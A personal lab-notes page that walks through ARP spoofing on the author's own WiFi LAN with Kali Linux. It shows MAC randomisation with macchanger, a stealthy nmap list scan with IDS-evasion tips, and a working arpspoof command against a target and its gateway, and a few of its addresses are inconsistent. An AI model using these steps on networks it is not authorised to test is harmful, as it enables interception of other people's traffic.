# ARP spoofing

## Overhead

I have 2 devices connected to my LAN via WiFi.\
In one I have installed Kali Linux and I want to read the traffic of the other.

1. Get the IP
2. ARP spoof

## Get the IP

### Advance list scan to find the target

```
ip addr

2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    inet 192.168.1.181/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0

```

`192.168.1.181/24`

> Another reason for an advance list scan is stealth. In some cases, you do not want to begin with a full-scale assault on the target network that is likely to trigger IDS alerts and bring unwanted attention. A list scan is unobtrusive and provides information that may be useful in choosing which individual machines to target. It is possible, though highly unlikely, that the target will notice all of the reverse-DNS requests. When that is a concern, you can bounce through anonymous recursive DNS servers using the `--dns-servers` option as described in [the section called “DNS proxying”](https://nmap.org/book/subvert-ids.html#defeating-firewalls-dns-proxy).

```
sudo macchanger -r eth0 
nmap -sL 192.168.1.0/24
```

Feels like this reverse DNS request is pretty broken...

```
Nmap scan report for OnePlus5.blabla.bla (192.168.1.115)
```

## ARP

> ARP only works with 32-bit IP addresses in the older IPv4 standard. The newer IPv6 protocol uses a different protocol, Neighbor Discovery Protocol (NDP), which is secure and uses cryptographic keys to verify host identities. However, since most of the Internet still uses the older IPv4 protocol, ARP remains in wide use.

<details>

<summary>How ARP spoofing works?</summary>

It works cuz every ARP-request to a node completely updates the ARP table present in the cache dedicated to it by the protocol, without respecting the pre-existing entries in the Routing table.

So if the hacker impersonate the router and send an ARP request to a host, this host will think that the hacker is the router.\
And again, if the hacker impersonate the target host and send an ARP request to the router, the router will think that the hacker is the host.\
\
In the end the ARP table of the target host will see the hacker MAC as the default gateway.

`192.168.1.1      HH:HH:HH:HH:HH:HH`

The ARP table of the router will see the hacker MAC as the host IP.

`192.168.1.115    HH:HH:HH:HH:HH:HH`

In the ARP table/cache of all devices this could be seen:

`192.168.1.25    HH:HH:HH:HH:HH:HH   -> the real IP of the host` \
`192.168.1.115    HH:HH:HH:HH:HH:HH  -> the spoofed one`

</details>

<details>

<summary>How frequently does a router perform Address resolution protocol (ARP)?</summary>

Guess what, depends by a lot of factors :D

</details>

## ARP spoofing

{% embed url="https://www.monkey.org/~dugsong/dsniff" %}

```
sudo arpspoof -i eth0 -t 192.168.1.115 -r 192.168.1.1 
```

Now, this is the command output:

```
hacker_mac target_mac 0806 42: arp reply 192.168.1.1 is-at hacker_mac
```

This is the ARP reply of the host (the target). \
This is saying that now the target thinks that the hacker\_mac is the default gateway. \
Then we can read another output line:

```
# dg_mac === default gateway MAC
hacker_mac dg_mac 0806 42: arp reply 192.168.1.93 is-at hacker_mac
```

This is the ARP reply of the default gateway that now thinks that the hacker\_mac is the host.&#x20;

{% hint style="danger" %}
But now, the connection of the host is not working. De fak? Why?\
Well, the hacker\_host is not configured to be a switch...\
Or better, ARP spoofing doesn't mean auto-packet-redirect !!!
{% endhint %}

## [ARP spoofing with packets redirect AKA Man in the Middle](man-in-the-middle-with-arp-spoofing.md)

## Sources

{% embed url="https://nmap.org/book/host-discovery-controls.html" %}

<details>

<summary>What is a reverse-DNS requests?</summary>

A reverse DNS is a DNS lookup of a domain name from an IP address.

You send and IP and you get the host name.

</details>

<details>

<summary>Can a host be invisible to reverse DNS request?</summary>

Idk but, I found that reverse DNS request can be filtered. This goes to Advance topic hands down.

</details>

<details>

<summary>Who is the DNS resolver?</summary>

```bash
cat /etc/resolv.conf 
# or better
( nmcli dev list || nmcli dev show ) | grep DNS
```

</details>

<details>

<summary>What is a ARP spoofing / ARP poisoning?</summary>

Is a technique by which an attacker sends ([spoofed](https://en.wikipedia.org/wiki/Spoofing\_attack)) ARP messages onto a LAN. Generally, the aim is to associate the attacker's MAC address with the IP address of another host, such as the default gateway, causing any traffic meant for that IP address to be sent to the attacker instead.

</details>

{% embed url="https://www.youtube.com/playlist?list=PLTgRMOcmRb3PS-l6V_r3gCwKjVRWvCMQa" %}

